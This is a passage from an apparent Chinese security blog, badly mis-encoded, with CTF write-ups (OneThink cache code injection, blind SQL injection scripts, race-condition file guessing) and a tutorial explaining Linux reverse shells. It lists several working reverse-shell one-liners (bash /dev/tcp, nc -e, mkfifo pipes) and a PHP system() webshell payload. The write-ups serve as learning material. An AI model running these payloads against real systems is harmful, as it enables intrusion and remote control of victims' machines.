â€”â€”ç™»å½•å¾—åˆ°æ–°é¡µé¢manageâ€”â€”å†æ¬¡çœ‹åˆ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨phpå°è£…åè®®ï¼Œè¯»å–æºä»£ç â€”â€”è·å¾—flag webâ€”â€”OneThinkåŸç†åœ¨è¿™é‡Œ:https://ca3tie1.github.io/post/onethink10-code-execute-writeup/æ€»ç»“èµ·æ¥å°±æ˜¯:æˆ‘ä»¬æ³¨å†Œçš„usernameä¼šè¢«ç¼“å­˜å†™å…¥ç¼“å­˜æ–‡ä»¶å¤¹ä¸­å¹¶è¿›è¡Œæ³¨é‡Šï¼Œä½¿å¾—å…¶ä¸­å†…å®¹ä¸ä¼šè¢«æ‰§è¡Œï¼Œå½“æˆ‘ä»¬åœ¨æ’å…¥æ•°æ®çš„å‰é¢æ·»åŠ æ¢è¡Œç¬¦ï¼Œæˆ‘ä»¬çš„è¯­å¥å°±ç»•è¿‡äº†æ³¨é‡Šç¬¦ï¼Œå°±å¯ä»¥è¢«æ‰§è¡Œï¼Œç™»å½•ä¹‹åå°±ä¼šç”ŸæˆRuntime/Temp/2bb202459c30a1628513f40ab22fa01a.phpæ–‡ä»¶å¤¹ï¼Œè®¿é—®å³å¯é¦–å…ˆç¡®å®šæˆ‘ä»¬æƒ³è¦æ’å…¥çš„è¯­å¥ï¼Œè¿™é‡Œå°±ç›´æ¥ä½¿ç”¨systemæ‹¿flagå§:$a=$_GET[â€˜aâ€™];system($a);è¿™é‡Œéœ€è¦åˆ†ä¸¤æ¬¡è¿›è¡Œæ³¨å†Œï¼Œå› ä¸ºæœ‰é•¿åº¦é™åˆ¶ ![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225122023.png) è¿™é‡Œè¯´ä¸€ä¸‹ä¸ºå•¥éœ€è¦urlè§£ç ä¸¤æ¬¡: 1.æˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥æ‰“å‡ºæœ‰æ¢è¡Œç¬¦çš„ç”¨æˆ·åï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå€ŸåŠ©urlç¼–ç åçš„æ¢è¡Œç¬¦ï¼Œä¼ å…¥ä»¥åä¼šç»è¿‡urlcodeï¼Œè¿™ä¸ªæ—¶å€™å°±å˜æˆäº†%250a,ç»è¿‡ä¸€æ¬¡è§£ç åå˜æˆ%0aå°±ä¸æ˜¯æ¢è¡Œç¬¦äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ‰“å‡º%0aåˆ°burp suité‡Œé¢ï¼Œå°†å…¶ä¸¤æ¬¡è§£ç æˆæ¢è¡Œç¬¦ï¼Œç„¶åä¼šç»è¿‡ä¸€æ¬¡urlcodå˜æˆ%0aæ¥ä¸‹æ¥å°±ä¼šå†æ¬¡è¢«è§£ç ä¸ºæ¢è¡Œç¬¦äº†ï¼Œå°±è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„äº† **PSï¼š**æ¯æ¬¡æ³¨å†Œå®Œéƒ½è¦ç™»å½•ï¼Œæ‰ä¼šè¢«å†™å…¥ç¼“å­˜æ–‡ä»¶å½“ä¸­ è®¿é—®ä¸€ä¸‹é“¾æ¥ï¼ŒæŸ¥çœ‹æºç å°±å¯ä»¥çœ‹åˆ°flagäº† 1Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=cat ../../flag.php 1flag{8e5702a3-5a1c-467b-9ad9-c771bd65dfea} åæ§½ä¸€æ³¢ è¿™ä¸ªç®€å•æ˜¯ç®€å•ï¼Œå°±æ˜¯å¤ªæ¶å¿ƒäº†å§ï¼ŒéªŒè¯ç ç»å¸¸å‡ºé”™â€“ï¼Œæ¯æ¬¡è¿˜è¦è¿ç»­æŒ‰ä¸¤æ¬¡å•Š webâ€”â€”æ”»å‡»1234567891011121314151617181920&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);show_source(__FILE__);echo '&lt;pre&gt;';include('u/ip.php');include('flag.php');if (in_array($_SERVER['REMOTE_ADDR'],$ip)){ die(&quot;æ‚¨çš„ipå·²è¿›å…¥ç³»ç»Ÿé»‘åå•&quot;);}var_dump($ip);if ($_POST[substr($flag,5,3)]=='attack'){ echo $flag;}else if (count($_POST)&gt;0){ $ip = '$ip[]=&quot;'.$_SERVER['REMOTE_ADDR'].'&quot;;'.PHP_EOL; file_put_contents('u/ip.php',$ip,FILE_APPEND);}echo '&lt;/pre&gt;'; æ ¹æ®ä»¥ä¸Šä»£ç æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä»–ä¸€ä¸ªipåªèƒ½æ”»å‡»ä¸€æ¬¡ï¼Œä½†æ˜¯å®ƒæ²¡å¯¹ä¸€æ¬¡å¯ä»¥postçš„æ•°æ®é‡é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå¤§å­—å…¸ï¼Œç›´æ¥ä¸€èµ·æäº¤ä¸Šå»ï¼Œä»–è¿™è¾¹éœ€è¦æˆ‘ä»¬æäº¤çš„æ˜¯ä»flagç¬¬5ä½å¼€å§‹ï¼Œä¸€å…±ä¸‰ä½çš„å­—ç¬¦ä¸²ï¼Œpythonè„šæœ¬å¦‚ä¸‹: 12345678910import requestsa = &quot;0123456789abcdefgh&quot;data = {}for i in a: for j in a: for k in a: data[i+j+k]=&quot;attack&quot;print(data)s=requests.post(&quot;http://ff9c93ad21d04a7982ebe8103dba94498e3845a6b33f49f5.changame.ichunqiu.com/&quot;,data=data)print(s.text) flag{269f92bb-9d65-44fc-8436-806b0bb6c5d1} webâ€”â€”æ—¶é—´:123456789101112&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);'å¤©ä¸‹æ­¦åŠŸå”¯å¿«ä¸ç ´';setcookie('token','hello');show_source(__FILE__);if ($_COOKIE['token']=='hello'){ $txt = file_get_contents('flag.php'); $filename = 'u/'.md5(mt_rand(1,1000)).'.txt';//ç”Ÿæˆä¸€ä¸ªéšæœºtxtæ–‡ä»¶ file_put_contents($filename,$txt);//å°†flag.phpçš„å†…å®¹å†™å…¥txtä¸­ sleep(10); unlink($filename);} æ‰€ä»¥æ˜¯è¿™æ ·çš„ï¼Œå½“æˆ‘ä»¬ç”¨åä¸ºtokenå€¼ä¸ºhelloçš„cookieè®¿é—®é¡µé¢çš„æ—¶å€™ï¼Œä¼šç”Ÿæˆä¸€ä¸ªéšæœºtxtæ–‡ä»¶ï¼Œå¹¶ä¸”flag.phpçš„å†…å®¹ä¼šå†™å…¥å…¶ä¸­ï¼Œç»è¿‡åç§’åï¼Œæ–‡ä»¶å°±ä¼šè¢«åˆ é™¤ï¼Œ1.å…ˆç”Ÿæˆä¸€ä¸ªmd5åŠ å¯†çš„æ–‡ä»¶åå­—å…¸ï¼š 123import hashlibfor i in range(1,1000): print('u/'+hashlib.md5(str(i).encode('utf-8')).hexdigest()+'.txt') è¿™é‡Œæ—¢å¯ä»¥ä½¿ç”¨burpsuitå»è·‘ï¼Œä¹Ÿå¯ä»¥ç”¨å¾¡å‰‘å»è·‘ï¼Œå¯èƒ½è¦å¤šå°è¯•å‡ æ¬¡ï¼Œæ¯•ç«Ÿåªæœ‰åç§’é’Ÿï¼Œæˆ–è€…çº¿ç¨‹è°ƒå¤§ä¸€äº› 1 flag{913f76f9-9af0-4f9d-8c5b-a2195e64bd22} webâ€”â€”ç™»å½•æœ‰ä¸ªç™»å½•æ¡†ï¼š 12admin'or 1=1#admin'or 1=2# å›æ˜¾ä¸ä¸€æ · ç¬¬ä¸€ä¸ªå¯†ç é”™è¯¯ï¼Œç¬¬äºŒä¸ªç”¨æˆ·åé”™è¯¯ï¼Œå­˜åœ¨æ³¨å…¥ï¼Œburp suitè·‘ä¸€ä¸‹çœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆ:è®°å¾—ä»¥å‰çœ‹è¿‡likeå¯ä»¥ç›²æ³¨ï¼Œä»Šå¤©æ¥å­¦ä¹ ä¸€ä¸‹: LIKEè¯­æ³•LIKEè¯­å¥çš„è¯­æ³•æ ¼å¼æ˜¯:*select * from è¡¨å where å­—æ®µå like å¯¹åº”å€¼ï¼ˆå­ä¸²ï¼‰*å®ƒä¸»è¦æ˜¯é’ˆå¯¹å­—ç¬¦å‹å­—æ®µï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨ä¸€ä¸ªå­—ç¬¦å‹å­—æ®µåˆ—ä¸­æ£€ç´¢åŒ…å«å¯¹åº”å­ä¸²ã€‚ä¾‹å­ï¼š åé¢çš„%æ˜¯ä¸€ä¸ªé€šé…ç¬¦è¿˜æœ‰å¸¸ç”¨æ›´å¤šçš„é€šé…ç¬¦å‚è€ƒï¼š _ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼Œä¾‹å¦‚D___å°±ä»£è¡¨æ˜¾ç¤ºå‡ºä»¥Dä¸ºé¦–åé¢æ¥ä¸‰ä¸ªå­—ç¬¦çš„æ•°æ®https://blog.csdn.net/derpvailzhangfan/article/details/2452064è€Œè¿™é‡Œæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ æ„é€ ç›²æ³¨è¯­å¥121'or user_n3me like 'X%'#1'or p3ss_w0rd like 'X%'# è¿™é‡Œè¯´æ˜ä¸€ä¸‹ä¸ºä»€ä¹ˆå­—æ®µåä¸ºè¿™ä¸¤ä¸ªï¼Œå…¶å®æœ‰ç‚¹çŒœæµ‹çš„æˆåˆ†åœ¨è¿™é‡Œï¼Œå› ä¸ºè¿™é¢˜å¤§éƒ¨åˆ†å‡½æ•°éƒ½è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æƒ³è¦å¾—å‡ºå­—æ®µååªèƒ½é çŒœæµ‹ï¼Œæƒ³èµ·æ¥ä¹‹å‰ä¹Ÿæœ‰ä¸€é¢˜ä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œå­—æ®µåå°±è—åœ¨ç½‘é¡µæäº¤è¡¨å•çš„è¡¨åä¸­ æ¥ä¸‹æ¥çš„ä»»åŠ¡å°±æ˜¯ç¼–å†™ç›²æ³¨è„šæœ¬: 123456789101112131415import requestss=requests.session()url=r&quot;http://15de6b62f20a4f5ba230856fe9419aeef1b157ed7220439a.changame.ichunqiu.com/Challenges/login.php&quot;headers=s.get(url).headersusername=''password=''pay_try=&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;for j in range(0,10): for i in pay_try: payload = f&quot;1'or user_n3me like '{username + i}%'#&quot; data = {'username': payload, 'password': 'test'} if &quot;å¯†ç é”™è¯¯&quot; in s.post(url, data=data).text: username += i print(username) break å¾—åˆ°ç”¨æˆ·åbctf3dm1nã€‚å¯†ç çš„çˆ†ç ´å°±æŠŠpayloadçš„å†…å®¹æ›´æ¢ä¸€ä¸‹ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹è¿™ä¸ªé•¿åº¦ï¼Œç”±äºæˆ‘æ¯”è¾ƒæ‡’ï¼Œæ‰€ä»¥å°±æ²¡çˆ†ç ´é•¿åº¦ï¼Œç›´æ¥å»è¯•ï¼Œå¦‚æœæƒ³è¦å…ˆçˆ†ç ´é•¿åº¦å¯ä»¥è¿™æ ·å°†likeåé¢çš„å†…å®¹æ¢æˆ_å¹¶ä¸”éšç€å¾ªç¯æ¬¡æ•°çš„å¢åŠ _çš„æ•°é‡ä¼šå¢åŠ ï¼Œifçš„åˆ¤æ–­æ˜¯å¦‚æœç”¨æˆ·åé”™è¯¯ï¼Œå°±ç›´æ¥ç»ˆæ­¢æ•´ä¸ªç¨‹åº è¿™ä¸ªçœ‹èµ·æ¥å°±åƒæ˜¯MD5åŠ å¯†ï¼Œè§£å¯†ä¸€ä¸‹å¾—åˆ°:adminqwe123666 ç™»å½•åå¾—åˆ°è¿™ä¸ªä¿¡æ¯ï¼Œçœ‹èµ·æ¥åƒæ˜¯gitï¼Ÿ çŒœæµ‹æ˜¯æºç æ³„éœ²ï¼Œå·¥å…·æ‰«æä¸€ä¸‹ ä¹‹å‰ç”¨çš„éƒ½æ˜¯githackå¯èƒ½æ˜¯æˆ‘ç‰ˆæœ¬æ²¡æ›´æ–°ä¸€ç›´æ²¡çœ‹ä¸‹è½½å®Œå…¨ äºæ˜¯æˆ‘æ¢äº†ä¸€ä¸ªgit_extractï¼Œä¹Ÿä¸è¡Œï¼Ÿï¼Ÿåªæœ‰ä¸€ä¸ªflag.phpï¼Œé—®é¢˜å‡ºåœ¨å“ªäº†å—ï¼Œçœ‹äº†ä¸€ä¸‹wpå‘ç°ä¹Ÿæ˜¯è¿™æ ·å†™çš„å‘€ï¼Œäºæ˜¯å°±ç›´æ¥å»çœ‹äº†ä¸€ä¸‹åˆ«äººçš„é¢˜è§£ï¼Œå‘ç°ä¸‹è½½åˆ°é‚£ä¸ªæ–‡ä»¶ä»¥åï¼Œè®¿é—®å°±å¯ä»¥çœ‹åˆ°flagäº† REGEXPç›²æ³¨è¯­æ³•:æ³¨å…¥åŸç†REGEXPæ³¨å…¥ï¼Œå³regexpæ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥ã€‚REGEXPæ³¨å…¥ï¼Œåˆå«ç›²æ³¨å€¼æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚åº”ç”¨åœºæ™¯å°±æ˜¯ç›²æ³¨ï¼ŒåŸç†æ˜¯ç›´æ¥æŸ¥è¯¢è‡ªå·±éœ€è¦çš„æ•°æ®ï¼Œç„¶åé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚ ^è¡¨ç¤ºpattern(æ¨¡å¼ä¸²)çš„å¼€å¤´ã€‚å³è‹¥åŒ¹é…åˆ°usernameå­—æ®µä¸‹id=1çš„æ•°æ®å¼€å¤´ä¸ºaï¼Œåˆ™è¿”å›1ï¼›å¦åˆ™è¿”å›0ï¼ˆ2ï¼‰regexpå…³é”®å­—è¿˜å¯ä»¥ä»£æ›¿whereæ¡ä»¶é‡Œçš„=å· 1select * from users where password regexp '^ad'; ä½¿ç”¨åœºæ™¯ï¼š è¿‡æ»¤äº†=ã€inã€like ^è‹¥è¢«è¿‡æ»¤ï¼Œå¯ä½¿ç”¨$æ¥ä»åå¾€å‰è¿›è¡ŒåŒ¹é… å¸¸ç”¨regexpæ­£åˆ™è¯­å¥ï¼š 123regexp '^[a-z]' #åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­regexp '^r' #åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºrregexp '^r[a-z]' #åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­ ï¼ˆ3ï¼‰åœ¨è”åˆæŸ¥è¯¢ä¸­çš„ä½¿ç”¨ 11 union select 1,database() regexp '^s',3--+ ç›²æ³¨2.åˆ¤æ–­æ•°æ®åº“å 12' or database() regexp '^s'--+ æ­£å¸¸' or database() regexp 'y$'--+ æ­£å¸¸ å’Œä¸Šé¢çš„likeå·®ä¸å¤šä¸è¿‡é€šé…ç¬¦ä¸å¤ªä¸€æ ·","link":"/2021/02/24/i%E6%98%A5%E7%A7%8B8/"},{"title":"linuxåå¼¹shellçš„æœ¬è´¨(äºŒ)","text":"ä»€ä¹ˆæ˜¯åå¼¹shellshellæ˜¯ä»€ä¹ˆshellå¯ä»¥ç†è§£ä¸ºå°±æ˜¯ä¸€ä¸ªå¯ä»¥è¾“å…¥å‘½ä»¤çš„çª—å£ï¼Œå³å‘½ä»¤è¡Œçª—å£ åå¼¹shellreverse shellï¼Œå°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP/UDPç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯ã€‚reverse shellä¸telnetï¼Œsshç­‰æ ‡å‡†shellå¯¹åº”ï¼Œæœ¬è´¨ä¸Šæ˜¯ç½‘ç»œæ¦‚å¿µçš„å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„è§’è‰²åè½¬. åå¼¹shellçš„æœ¬è´¨:æ–‡å­—æè¿°:æ”»å‡»ç«¯ä¸ºattackerï¼Œè¢«æ”»å‡»ç«¯ä¸ºvictimattackerå’Œvictimåœ¨æŸä¸€ç«¯å£å®ç°äº’è”ï¼Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡linuxä¸­ä¸€åˆ‡çš†æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥ç†è§£æ˜¯ï¼Œattackerçš„è¾“å…¥é‡å®šå‘è‡³victimçš„è¾“å…¥ï¼Œvictimçš„è¾“å‡ºé‡å®šå‘è‡³attackeræ„æˆäº†è¿™æ ·ä¸€ä¸ªå›è·¯æ¥ä¸‹æ¥æˆ‘ä»¬æ¥åˆ†è§£è¿™ä¸€è¿‡ç¨‹: å‡†å¤‡attacker ipï¼š192.168.11.128victim ip: é¦–å…ˆåœ¨attackerä¸Šç›‘å¬ï¼š 1nc -lvp port åœ¨victimä¸Šæ‰§è¡Œ: 1bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 æ¥ä¸‹æ¥å°±å¯ä»¥çœ‹åˆ°åœ¨æˆ‘ä»¬çš„attackerä¸Šå®ç°äº†å¼¹å‡ºäº†victimçš„shellã€‚ å¹¶ä¸”å¯ä»¥åœ¨æ­¤æ‰§è¡Œå‘½ä»¤ï¼Œè·å¾—victimä¸Šçš„å†…å®¹ å‰–æå‘½ä»¤1.bash -i 1ï¼‰bash æ˜¯linux çš„ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„shell,å…¶å®linuxçš„shellè¿˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ shã€zshã€ç­‰ï¼Œä»–ä»¬ä¹‹é—´æœ‰ç€ç»†å°å·®åˆ« 2ï¼‰-i è¿™ä¸ªå‚æ•°è¡¨ç¤ºçš„æ˜¯äº§ç”Ÿäº¤äº’å¼çš„shell 2./dev/tcp/ip/port /dev/tcp|udp/ip/port è¿™ä¸ªæ–‡ä»¶æ˜¯ç‰¹åˆ«ç‰¹æ®Šçš„ï¼Œå®é™…ä¸Šå¯ä»¥å°†å…¶çœ‹æˆä¸€ä¸ªè®¾å¤‡ï¼ˆLinuxä¸‹ä¸€åˆ‡çš†æ–‡ä»¶ï¼‰ï¼Œå…¶å®å¦‚æœä½ è®¿é—®è¿™ä¸ªæ–‡ä»¶çš„ä½ç½®ä»–æ˜¯ä¸å­˜åœ¨çš„ï¼Œå¦‚ä¸‹å›¾ï¼š ä½†æ˜¯å¦‚æœä½ åœ¨ä¸€æ–¹ç›‘å¬ç«¯å£çš„æƒ…å†µä¸‹å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè¯»å†™ï¼Œå°±èƒ½å®ç°ä¸ç›‘å¬ç«¯å£çš„æœåŠ¡å™¨çš„socketé€šä¿¡ äº¤äº’é‡å®šå‘â€”â€”åˆ†è§£äº¤äº’è¿‡ç¨‹1å®ç°victimä¸Šçš„è¾“å…¥è¾“å‡ºè‡³attackerä¸­ï¼ˆvictimè¾“å‡ºé‡å®šå‘ï¼‰åœ¨attackerä¸Šè¾“å…¥: 1nc -lvp port åœ¨victimä¸Šè¾“å…¥: 1base -i &gt; /dev/tcp/ip/port æ­¤æ—¶ åœ¨victimä¸Šçš„è¾“å…¥ï¼Œä¼šè¾“å‡ºè‡³attacker ä½†æ˜¯ attackerå´æ— æ³•å¯¹victimè¿›è¡Œå¹²æ‰° 2.å®ç°attackerä¸Šçš„è¾“å…¥è‡³victimï¼ˆvictimè¾“å…¥é‡å®šå‘ï¼‰åœ¨victimä¸Šè¾“å…¥: 1bash -i &lt; /dev/tcp/192.168.11.128/2333 åœ¨attackerä¸Šè¾“å…¥çš„å†…å®¹å°±ä¼šè¢«é‡å®šå‘è‡³victimä¸­ 3.ç»“åˆä»¥ä¸Šä¸¤æ¡æŒ‡ä»¤åœ¨victimä¸Šè¾“å…¥: 1bash -i &gt; /dev/tcp/192.168.11.128/2333 0&gt;&amp;1 æˆ‘ä»¬ä»å·¦åˆ°å³åˆ†æï¼Œæ­¤æ—¶victimçš„è¾“å‡ºé‡å®šå‘è‡³attackerï¼Œæ¥ä¸‹æ¥æ˜¯0&gt;&amp;1,å³å°†attackerçš„è¾“å…¥é‡å®šå‘è¾“å‡ºåˆ°victimçš„è¾“å…¥ï¼Œè€Œä¹‹å‰æˆ‘ä»¬è¯´äº†ï¼Œvictimçš„è¾“å…¥ä¼šé‡å®šå‘è¾“å‡ºè‡³attackerï¼Œå¯èƒ½æœ‰ç‚¹ç»•ï¼ŒæŠŠè¿™ä¸ªæƒ³è±¡æˆä¸€ä¸ªå›è·¯ ä½†æ˜¯ï¼Œæˆ‘ä»¬åœ¨victimä¸Šä»ç„¶å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨attackerè¾“å…¥çš„å‘½ä»¤ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºattackerçš„è¾“å…¥é‡å®šå‘è¾“å‡ºåˆ°äº†victimï¼Œæ¥ä¸‹æ¥victimæ‰ä¼šæ ¹æ®è¿™ä¸ªè¾“å…¥æ‰§è¡Œè¾“å‡ºç»“æœ è¯¥å¦‚ä½•è§£å†³å‘¢ï¼Ÿä½¿ç”¨ :&gt;&amp;word= &gt; word 2&gt;&amp;1 1bash -i &gt;&amp; /dev/tcp/192.168.11.128/2333 0&gt;&amp;1 è§£æï¼šä»victimçš„æ ‡å‡†è¾“å‡ºä»¥åŠæ ‡å‡†é”™è¯¯è¾“å‡ºéƒ½é‡å®šå‘åˆ°äº†attackerï¼Œè€Œattackerçš„è¾“å…¥åˆé‡å®šå‘è¾“å…¥è‡³victimï¼Œæ­¤æ—¶victimæ¥æ”¶åˆ°äº†æˆ‘ä»¬ä»attackerä¸Šçš„æ ‡å‡†è¾“å…¥ï¼Œæ‰§è¡Œå‘½ä»¤æ ‡å‡†è¾“å‡ºè‡³attackerï¼Œä½†ç”±äºæ ‡å‡†é”™è¯¯è¾“å‡ºä¹Ÿé‡å®šå‘åˆ°äº†attackerï¼Œæ‰€ä»¥åœ¨victimä¸Šå°±çœ‹ä¸åˆ°æˆ‘ä»¬çš„å‘½ä»¤äº†ã€‚æœ‰ç‚¹ç»•ï¼Œè¿˜æ˜¯æƒ³è±¡æˆä¸€ä¸ªç¯ï¼Œåªä¸è¿‡åˆšæ‰çš„æ•°æ®ç¯è¿ä½œè¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€ä¸ªä¿¡æ¯åœæ»æ²¡èµ°ã€‚ å¸¸è§çš„åå¼¹shellè¯­å¥1.æ–¹æ³•ä¸€1bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1 å’Œ 1bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;1 è¿™é‡Œçš„å”¯ä¸€åŒºåˆ«å°±æ˜¯ 0&gt;&amp;1 å’Œ 0&lt;&amp;1 ï¼Œå…¶å®å°±æ˜¯æ‰“å¼€æ–¹å¼çš„ä¸åŒï¼Œè€Œå¯¹äºè¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æ¥è®²å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼ˆæˆ‘åœ¨ä¸Šé¢ç»™å‡ºé“¾æ¥çš„æ–‡ç« ä¸­ä¹Ÿç‰¹åœ°ç”¨åŠ ç²—çš„å½¢å¼è§£é‡Šäº†ï¼‰ 2.æ–¹æ³•äºŒ1bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 &lt;&amp;2 ç­‰ä»·äº 1bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;2 è¿™é‡Œå†è°ˆè°ˆç†è§£ï¼Œé¦–å…ˆvictimçš„æ ‡å‡†è¾“å‡ºä»¥åŠæ ‡å‡†é”™è¯¯è¾“å‡ºè‡³attackerè¾“å‡ºï¼Œè€Œattackerçš„æ ‡å‡†è¾“å…¥è‡³victimçš„æ ‡å‡†é”™è¯¯è¾“å‡ºä¸Šï¼Œè€Œvictimçš„æ ‡å‡†é”™è¯¯è¾“å‡ºè¾¹å¦‚å‰é¢æ‰€è¯´çš„æœ‰attackerè¾“å‡ºã€‚ 3.æ–¹æ³•ä¸‰1exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done ç®€å•çš„è§£é‡Šä¸€ä¸‹ï¼š 1exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333 è¿™ä¸€å¥å°†æ–‡ä»¶æè¿°ç¬¦5é‡å®šå‘åˆ°äº† /dev/tcp/192.168.146.129/2333 å¹¶ä¸”æ–¹å¼æ˜¯è¯»å†™æ–¹å¼ï¼ˆè¿™ç§æ–¹æ³•åœ¨æˆ‘çš„å‰é¢çš„æ–‡ç« ä¸­ä¹Ÿè®²åˆ°è¿‡ï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬å°±èƒ½é€šè¿‡æ–‡ä»¶æè¿°ç¬¦å¯¹è¿™ä¸ªsocketè¿æ¥è¿›è¡Œæ“ä½œäº† 1command|while read line do .....done è¿™ä¸ªæ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„å¥å­ï¼Œå®ƒçš„åŸå¥æ˜¯è¿™æ ·çš„ 1234while read linedo â€¦done &lt; file ä»æ–‡ä»¶ä¸­ä¾æ¬¡è¯»å–æ¯ä¸€è¡Œï¼Œå°†å…¶èµ‹å€¼ç»™ line å˜é‡ï¼ˆå½“ç„¶è¿™é‡Œå˜é‡å¯ä»¥å¾ˆå¤šï¼Œä»¥ç©ºæ ¼åˆ†éš”ï¼Œè¿™é‡Œæˆ‘å°±ä¸¾ä¸€ä¸ªå˜é‡çš„ä¾‹å­ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªå˜é‡çš„è¯ï¼Œé‚£ä¹ˆä¸€æ•´è¡Œéƒ½æ˜¯å®ƒçš„äº†ï¼‰ï¼Œä¹‹åå†åœ¨å¾ªç¯ä¸­å¯¹lineè¿›è¡Œæ“ä½œã€‚ è€Œç°åœ¨æˆ‘ä»¬ä¸æ˜¯ä»file æ–‡ä»¶ä¸­è¾“å…¥äº†ï¼Œæˆ‘ä»¬ä½¿ç”¨ç®¡é“ç¬¦å¯¹æ”»å‡»è€…æœºå™¨ä¸Šè¾“å…¥çš„å‘½ä»¤ä¾æ¬¡æ‰§è¡Œï¼Œå¹¶å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºéƒ½é‡å®šå‘åˆ°äº†æ–‡ä»¶æè¿°ç¬¦5ï¼Œä¹Ÿå°±æ˜¯æ”»å‡»æœºä¸Šï¼Œå®ç°äº¤äº’å¼shellçš„åŠŸèƒ½ã€‚ ä¸ä¹‹å®Œå…¨ç±»ä¼¼çš„è¿˜æœ‰ä¸‹é¢è¿™æ¡æŒ‡ä»¤ï¼Œè¯»è€…æœ‰å…´è¶£å¯ä»¥è‡ªå·±åˆ†æä¸€ä¸‹ï¼š 10&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 4.æ–¹æ³•å››nc å¦‚æœå®‰è£…äº†æ­£ç¡®çš„ç‰ˆæœ¬ï¼ˆå­˜åœ¨-e é€‰é¡¹å°±èƒ½ç›´æ¥åå¼¹shellï¼‰ 1nc -e /bin/sh 192.168.146.129 2333 ä½†æ˜¯å¦‚æœæ˜¯æ²¡æœ‰-e é€‰é¡¹æ˜¯ä¸æ˜¯å°±ä¸èƒ½å®ç°äº†å‘¢ï¼Ÿå½“ç„¶ä¸æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥å‘ä¸‹é¢è¿™æ · 1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f ç®€å•çš„è§£é‡Šï¼š mkfifo å‘½ä»¤é¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ªç®¡é“ï¼Œcat å°†ç®¡é“é‡Œé¢çš„å†…å®¹è¾“å‡ºä¼ é€’ç»™/bin/shï¼Œshä¼šæ‰§è¡Œç®¡é“é‡Œçš„å‘½ä»¤å¹¶å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºç»“æœé€šè¿‡nc ä¼ åˆ°è¯¥ç®¡é“ï¼Œç”±æ­¤å½¢æˆäº†ä¸€ä¸ªå›è·¯ ç±»ä¼¼çš„å‘½ä»¤ï¼š 1mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe å°ç»“é€šè¿‡è¿™ä¸¤å¤©çš„å­¦ä¹ ï¼Œæ„Ÿè§‰å¯¹äºlinuxåå¼¹shellç»ˆäºæœ‰äº†ä¸€äº›æ›´æ·±çš„ç†è§£ï¼Œæ„Ÿè§‰å¯¹äºä¹‹å‰çš„cat /&gt;flagç­‰çš„ç†è§£éƒ½å˜æ·±äº†ä¸€äº›ï¼Œå°¤å…¶æ˜¯ä¹‹é—´çš„äº¤äº’ä½œç”¨çš„åŸç†deç†è§£ 